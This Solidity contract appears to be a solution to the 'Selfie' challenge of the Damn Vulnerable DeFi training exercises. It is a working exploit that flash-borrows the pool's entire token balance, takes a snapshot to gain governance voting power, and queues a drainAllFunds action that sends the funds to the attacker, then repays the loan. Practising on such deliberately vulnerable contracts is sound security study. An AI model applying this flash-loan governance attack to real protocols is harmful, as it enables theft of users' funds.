// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableTokenSnapshot.sol";

interface IGovernance {
    function queueAction(
        address receiver, 
        bytes calldata data, 
        uint256 weiAmount
    ) external returns (uint256);
}

contract SelfieExploiter {

    using Address for address;

    DamnValuableTokenSnapshot private token; // deposit token
    IGovernance private governance;
    address private pool;
    address private owner;
    uint256 public actionId; // could just get this from event

    constructor(
        address _tokenAddress, 
        address _governanceAddress, 
        address _poolAddress
    ) {
        token = DamnValuableTokenSnapshot(_tokenAddress);
        governance = IGovernance(_governanceAddress);
        pool = _poolAddress;
        owner = msg.sender;
    }

    // @dev run the exploit, queues the exploit governance action
    function runExploit() external {
        pool.functionCall(abi.encodeWithSignature("flashLoan(uint256)",token.balanceOf(pool))); // request all funds from pool
    }

    // @dev callback for flash loan
    function receiveTokens(address _token, uint256 borrowAmount) external {
        require(msg.sender == pool, "invalid callback.");

        token.snapshot(); // anyone is able to create a snapshot
        bytes memory data = abi.encodeWithSignature("drainAllFunds(address)",owner);
        actionId = governance.queueAction(pool,data,0);
        token.transfer(msg.sender,borrowAmount);
    }

}